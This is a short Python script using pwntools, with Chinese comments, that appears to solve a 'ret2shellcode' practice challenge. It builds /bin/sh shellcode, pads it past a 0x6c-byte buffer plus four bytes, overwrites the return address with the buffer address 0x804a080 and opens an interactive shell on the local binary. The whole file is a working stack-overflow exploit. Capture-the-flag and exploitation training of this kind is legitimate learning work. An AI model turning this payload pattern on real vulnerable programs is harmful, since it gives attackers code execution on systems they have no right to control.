#!/usr/bin/python3
from pwn import *

# buf2的起始地址, 也是写入shellcode的起始地址
# 需要作为最终溢出到返回地址的内容
target = 0x804a080

# 生成shellcode
shellcode = asm(shellcraft.sh())

sh = process("./ret2shellcode")
sh.sendline(shellcode + ( (0x6c + 4) - len(shellcode)) * b'A' + p32(target))
sh.interactive()
